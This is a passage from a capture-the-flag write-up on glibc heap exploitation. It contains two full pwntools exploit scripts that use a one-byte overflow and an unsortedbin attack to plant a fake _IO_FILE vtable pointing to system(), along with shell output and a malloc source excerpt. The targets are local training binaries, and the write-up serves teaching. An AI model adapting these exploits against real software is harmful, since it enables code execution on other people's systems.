</span></span><span><span>        proc<span>.</span>send(<span>b</span><span>&#34;1&#34;</span>)
</span></span><span><span>    <span>elif</span> size <span>==</span> <span>0xfc0</span>:
</span></span><span><span>        proc<span>.</span>send(<span>b</span><span>&#34;2&#34;</span>)
</span></span><span><span>    <span>else</span>:
</span></span><span><span>        <span>raise</span> Exception(<span>&#34;size must be 0xfc0 (large) or 0x18 (small)&#34;</span>)
</span></span><span><span>    proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>edit</span>(data):
</span></span><span><span>    <span>if</span> <span>len</span>(data) <span>&gt;</span> <span>0xf0</span>:
</span></span><span><span>        <span>raise</span> Exception(<span>&#34;data cannot be larger than 0xf0 bytes&#34;</span>)
</span></span><span><span>    proc<span>.</span>send(<span>b</span><span>&#34;3&#34;</span>)
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;data: &#34;</span>, data)
</span></span><span><span>    proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>
</span></span><span><span>proc <span>=</span> remote(<span>&#34;localhost&#34;</span>, <span>1337</span>)
</span></span><span><span>
</span></span><span><span>proc<span>.</span>recvuntil(<span>b</span><span>&#34;puts() @ &#34;</span>)
</span></span><span><span>libc<span>.</span>address <span>=</span> <span>int</span>(proc<span>.</span>recvline(), <span>16</span>) <span>-</span> libc<span>.</span>sym<span>.</span>puts
</span></span><span><span>
</span></span><span><span>proc<span>.</span>recvuntil(<span>b</span><span>&#34;heap @ &#34;</span>)
</span></span><span><span>heap <span>=</span> <span>int</span>(proc<span>.</span>recvline(), <span>16</span>)
</span></span><span><span>
</span></span><span><span>proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>proc<span>.</span>timeout <span>=</span> <span>0.5</span>
</span></span><span><span>
</span></span><span><span>fake_vtable <span>=</span> flat(
</span></span><span><span>    p64(<span>0</span>),
</span></span><span><span>    p64(<span>0</span>),
</span></span><span><span>    p64(<span>0xcafebabe</span>),
</span></span><span><span>    p64(libc<span>.</span>sym<span>.</span>system),
</span></span><span><span>)
</span></span><span><span>fake_filep <span>=</span> flat(
</span></span><span><span>    <span>b</span><span>&#34;/bin/sh</span><span>\x00</span><span>&#34;</span>, <span># _flags / old_top_chunk.prev_size</span>
</span></span><span><span>    p64(<span>0x60</span> <span>|</span> <span>0b1</span>), <span># _IO_read_ptr / old_top_chunk.size</span>
</span></span><span><span>    p64(<span>0</span>),
</span></span><span><span>    p64(libc<span>.</span>sym<span>.</span>_IO_list_all<span>-</span><span>0x10</span>), <span># old_top_chunk.bk</span>
</span></span><span><span>    p64(<span>1</span>), <span># _IO_write_base</span>
</span></span><span><span>    p64(<span>2</span>), <span># _IO_write_ptr</span>
</span></span><span><span>    fake_vtable,
</span></span><span><span>    <span>b</span><span>&#34;</span><span>\x00</span><span>&#34;</span><span>*</span>(<span>0xc0</span><span>-</span><span>0x30</span><span>-</span><span>len</span>(fake_vtable)),
</span></span><span><span>    p32(<span>0</span>), <span># _mode</span>
</span></span><span><span>    <span>b</span><span>&#34;</span><span>\x00</span><span>&#34;</span><span>*</span><span>20</span>,
</span></span><span><span>    p64(heap<span>+</span><span>0x20</span><span>+</span><span>0x30</span>), <span># vtable</span>
</span></span><span><span>)
</span></span><span><span>
</span></span><span><span><span># phase 1: turn top chunk into a small chunk and add it to the unsortedbin</span>
</span></span><span><span>malloc(<span>0x20</span><span>-</span><span>8</span>)
</span></span><span><span>edit(<span>b</span><span>&#34;A&#34;</span><span>*</span><span>0x18</span> <span>+</span> p64((<span>0x1000</span><span>-</span><span>0x20</span>) <span>|</span> <span>0b001</span>)) <span># clobber top chunk&#39;s size</span>
</span></span><span><span>malloc(<span>0xfc0</span>) <span># allocate a chunk large enough to brk a new top chunk and free the old one</span>
</span></span><span><span><span># unsortedbin: [old_top_chunk, size: 0xfc0, fd: &amp;main_arena.bins[0], bk: &amp;main_arena.bins[0]]</span>
</span></span><span><span>
</span></span><span><span><span># phase 3: fake _IO_FILE_plus with malicious vtable</span>
</span></span><span><span>edit(<span>b</span><span>&#34;A&#34;</span><span>*</span><span>0x10</span> <span>+</span> fake_filep)
</span></span><span><span><span># unsortedbin: [old_top_chunk, size: 0x18, fd: NULL, bk: &amp;main_arena-0x10]</span>
</span></span><span><span><span># phase 2: unsortedbin attack to clobber _IO_list_all to point to fake _IO_FILE_plus</span>
</span></span><span><span>malloc(<span>0x20</span><span>-</span><span>8</span>) <span># serviced from the unsortedbin, results in old_top_chunk.bk-&gt;fd = &amp;old_top_chunk</span>
</span></span><span><span>
</span></span><span><span>proc<span>.</span>sendline(<span>b</span><span>&#34;id&#34;</span>)
</span></span><span><span><span>print</span>(proc<span>.</span>recvline())</span></span></code></pre></div>
</details>






  
  
    

  
  
    







<div><pre tabindex="0"><code data-lang="text"><span><span>b&#39;uid=1000(pwny) gid=100(users) groups=100(users),1(wheel)\n&#39;</span></span></code></pre></div>

<h3 id="challenge-solve">Challenge solve</h3>
<p>There are two main differences from the previous challenge.</p>
<p>First, we can only allocate chunks of size 0x60, so the chunk we use for the unsortedbin attack must be of size 0x68 instead; this will still fit in the 0x60 smallbin, but will avoid <kbd>_int_malloc</kbd>’s fastpath that avoids binning when the chunk in the unsortedbin is an exact match for the requested size.</p>





  
  
    

  
  
    







<details open="">
  <summary>C</summary>
  <div><div>
<table><tbody><tr><td>
<pre tabindex="0"><code><span>3519
</span><span>3520
</span><span>3521
</span><span>3522
</span><span>3523
</span><span>3524
</span><span>3525
</span><span>3526
</span><span>3527
</span><span>3528
</span><span>3529
</span><span>3530
</span></code></pre></td>
<td>
<pre tabindex="0"><code data-lang="c"><span><span><span>/* Take now instead of binning if exact fit */</span>
</span></span><span><span>
</span></span><span><span><span>if</span> (size <span>==</span> nb)
</span></span><span><span>{
</span></span><span><span>    <span>set_inuse_bit_at_offset</span> (victim, size);
</span></span><span><span>    <span>if</span> (av <span>!=</span> <span>&amp;</span>main_arena)
</span></span><span><span>    victim<span>-&gt;</span>size <span>|=</span> NON_MAIN_ARENA;
</span></span><span><span>    <span>check_malloced_chunk</span> (av, victim, nb);
</span></span><span><span>    <span>void</span> <span>*</span>p <span>=</span> <span>chunk2mem</span> (victim);
</span></span><span><span>    <span>alloc_perturb</span> (p, bytes);
</span></span><span><span>    <span>return</span> p;
</span></span><span><span>}</span></span></code></pre></td></tr></tbody></table>
</div>
</div>
</details>

<p>Second, instead of a very generous heap overflow we can only overflow the first byte of the next chunk’s size field (and flags).
Instead of clobbering the top chunk’s size field like we did last time, we can allocate two chunks next to each other, double the first chunk’s size, free this large chunk to put a 0xc0 sized chunk in the unsortedbin freelist and finally allocate a new 0x60 chunk to split the tail of the unsortedbin into two 0x60 sized chunks (the first of which is used to service the request).
This results in a UAF of the second chunk, which we can use to clobber unsortedbin linked list pointers (and ultimately leak libc/heap pointers and perform an FSOP attack).</p>





  
  
    

  
  
    







<details open="">
  <summary>Python</summary>
  <div><pre tabindex="0"><code data-lang="python"><span><span><span>from</span> pwn <span>import</span> <span>*</span>
</span></span><span><span>
</span></span><span><span>context<span>.</span>log_level <span>=</span> <span>&#39;warning&#39;</span>
</span></span><span><span>
</span></span><span><span>elf <span>=</span> context<span>.</span>binary <span>=</span> ELF(<span>&#34;one_byte&#34;</span>)
</span></span><span><span>libc <span>=</span> ELF(elf<span>.</span>runpath <span>+</span> <span>b</span><span>&#34;/libc.so.6&#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>calloc</span>(size):
</span></span><span><span>    <span>if</span> size <span>!=</span> <span>0x58</span>:
</span></span><span><span>        <span>raise</span> Exception(<span>&#34;size must be 0x58&#34;</span>)
</span></span><span><span>    proc<span>.</span>send(<span>b</span><span>&#34;1&#34;</span>)
</span></span><span><span>    proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>free</span>(index):
</span></span><span><span>    proc<span>.</span>send(<span>b</span><span>&#34;2&#34;</span>)
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;index: &#34;</span>, <span>f</span><span>&#34;</span><span>{</span>index<span>}</span><span>&#34;</span><span>.</span>encode())
</span></span><span><span>    proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>edit</span>(index, data):
</span></span><span><span>    <span>if</span> <span>len</span>(data) <span>&gt;</span> <span>0x59</span>:
</span></span><span><span>        <span>raise</span> Exception(<span>&#34;data cannot be larger than 0x59 bytes&#34;</span>)
</span></span><span><span>    proc<span>.</span>send(<span>b</span><span>&#34;3&#34;</span>)
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;index: &#34;</span>, <span>f</span><span>&#34;</span><span>{</span>index<span>}</span><span>&#34;</span><span>.</span>encode())
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;data: &#34;</span>, data)
</span></span><span><span>    proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>read</span>(index):
</span></span><span><span>    proc<span>.</span>send(<span>b</span><span>&#34;4&#34;</span>)
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;index: &#34;</span>, <span>f</span><span>&#34;</span><span>{</span>index<span>}</span><span>&#34;</span><span>.</span>encode())
</span></span><span><span>    ret <span>=</span> proc<span>.</span>recvline()<span>.</span>strip()
</span></span><span><span>    proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>    <span>return</span> ret
</span></span><span><span>
</span></span><span><span>proc <span>=</span> remote(<span>&#34;localhost&#34;</span>, <span>1337</span>)
</span></span><span><span>
</span></span><span><span>proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>proc<span>.</span>timeout <span>=</span> <span>0.5</span>
</span></span><span><span>
</span></span><span><span>
</span></span><span><span>calloc(<span>0x60</span><span>-</span><span>8</span>) <span># chunk A</span>
</span></span><span><span>calloc(<span>0x60</span><span>-</span><span>8</span>) <span># chunk B</span>
</span></span><span><span>calloc(<span>0x60</span><span>-</span><span>8</span>) <span># chunk C</span>
</span></span><span><span>calloc(<span>0x60</span><span>-</span><span>8</span>) <span># chunk D</span>
</span></span><span><span>calloc(<span>0x60</span><span>-</span><span>8</span>) <span># chunk E</span>
</span></span><span><span>calloc(<span>0x60</span><span>-</span><span>8</span>) <span># chunk F</span>
</span></span><span><span>calloc(<span>0x60</span><span>-</span><span>8</span>) <span># chunk G</span>
</span></span><span><span>calloc(<span>0x60</span><span>-</span><span>8</span>) <span># chunk H; protects other chunks against consolidation with top chunk</span>
</span></span><span><span>edit(<span>0</span>, <span>b</span><span>&#34;A&#34;</span><span>*</span><span>0x58</span> <span>+</span> p8(<span>0xc0</span> <span>|</span> <span>0b1</span>)) <span># make chunk B completely overlap chunk C</span>
</span></span><span><span>edit(<span>3</span>, <span>b</span><span>&#34;D&#34;</span><span>*</span><span>0x58</span> <span>+</span> p8(<span>0xc0</span> <span>|</span> <span>0b1</span>)) <span># make chunk E overlap chunk F</span>
</span></span><span><span>free(<span>1</span>) <span># free chunk B</span>
</span></span><span><span><span># unsortedbin: [chunk B (+ C), size: 0xc0, fd: &amp;main_arena.top, bk: &amp;main_arena.top]</span>
</span></span><span><span>calloc(<span>0x60</span><span>-</span><span>8</span>) <span># chunk I; service this request from the tail of the unsortedbin, causing it to be split in two</span>
</span></span><span><span><span># unsortedbin: [chunk C, size: 0x60, fd: &amp;main_arena.top, bk: &amp;main_arena.top]</span>
</span></span><span><span>
</span></span><span><span><span># leaks</span>
</span></span><span><span>libc<span>.</span>address <span>=</span> u64(read(<span>2</span>)[:<span>8</span>]) <span>-</span> (libc<span>.</span>sym<span>.</span>main_arena<span>+</span><span>0x58</span>)
</span></span><span><span>free(<span>4</span>)
</span></span><span><span><span># unsortedbin: [chunk E (+ F), size: 0xc0, fd: &amp;chunk_c, bk: &amp;main_arena.bins[0]-0x10] -&gt; [chunk C, size: 0x60, fd: &amp;main_arena.bins[0]-0x10, bk: &amp;chunk_e]</span>
</span></span><span><span>heap <span>=</span> u64(read(<span>2</span>)[<span>8</span>:<span>16</span>]) <span>-</span> <span>0x180</span>
</span></span><span><span>calloc(<span>0x60</span><span>-</span><span>8</span>) <span># chunk J</span>
</span></span><span><span><span># unsortedbin: [chunk E (+ F), size: 0xc0, fd: &amp;main_arena.bins[0]-0x10, bk: &amp;main_arena.bins[0]-0x10]</span>
</span></span><span><span>calloc(<span>0x60</span><span>-</span><span>8</span>) <span># chunk K</span>
</span></span><span><span><span># unsortedbin: [chunk F, size: 0x60, fd: &amp;main_arena.bins[0]-0x10, bk: &amp;main_arena.bins[0]-0x10]</span>
</span></span><span><span>
</span></span><span><span><span># construct fake file</span>
</span></span><span><span>fake_vtable <span>=</span> flat(
</span></span><span><span>    p64(<span>0</span>),
</span></span><span><span>    p64(<span>0</span>),
</span></span><span><span>    p64(<span>0xcafebabe</span>),
</span></span><span><span>    p64(libc<span>.</span>sym<span>.</span>system),
</span></span><span><span>)
</span></span><span><span>edit(<span>10</span>, <span>b</span><span>&#34;K&#34;</span><span>*</span><span>0x50</span> <span>+</span> <span>b</span><span>&#34;/bin/sh</span><span>\x00</span><span>&#34;</span> <span>+</span> p8(<span>0x68</span> <span>|</span> <span>0b1</span>))
</span></span><span><span>edit(<span>5</span>, flat(
</span></span><span><span>    p64(<span>0</span>),
</span></span><span><span>    p64(libc<span>.</span>sym<span>.</span>_IO_list_all<span>-</span><span>0x10</span>), <span># chunk_f.bk</span>
</span></span><span><span>    p64(<span>1</span>), <span># _IO_write_base</span>
</span></span><span><span>    p64(<span>2</span>), <span># _IO_write_ptr</span>
</span></span><span><span>    fake_vtable,
</span></span><span><span>))
</span></span><span><span>edit(<span>6</span>, flat(
</span></span><span><span>    <span>b</span><span>&#34;</span><span>\x00</span><span>&#34;</span><span>*</span>(<span>0xc0</span><span>-</span><span>8</span><span>-</span><span>0x68</span>),
</span></span><span><span>    p32(<span>0</span>), <span># _mode</span>
</span></span><span><span>))
</span></span><span><span>edit(<span>7</span>, flat(
</span></span><span><span>    <span>b</span><span>&#34;</span><span>\x00</span><span>&#34;</span><span>*</span>(<span>20</span><span>-</span><span>0x8</span><span>-</span><span>4</span>),
</span></span><span><span>    p64(heap<span>+</span><span>0x210</span>), <span># vtable</span>
</span></span><span><span>))
</span></span><span><span>calloc(<span>0x60</span><span>-</span><span>8</span>) <span># chunk L; carry out unsortedbin attack</span>
</span></span><span><span>
</span></span><span><span>proc<span>.</span>sendline(<span>b</span><span>&#34;id&#34;</span>)
</span></span><span><span><span>print</span>(proc<span>.</span>recvline())</span></span></code></pre></div>
</details>






  
  
    

  
  
    







<div><pre tabindex="0"><code data-lang="text"><span><span>b&#39;uid=1000(pwny) gid=100(users) groups=100(users),1(wheel)\n&#39;</span></span></code></pre></div>


</div></div>
  </body>
</html>
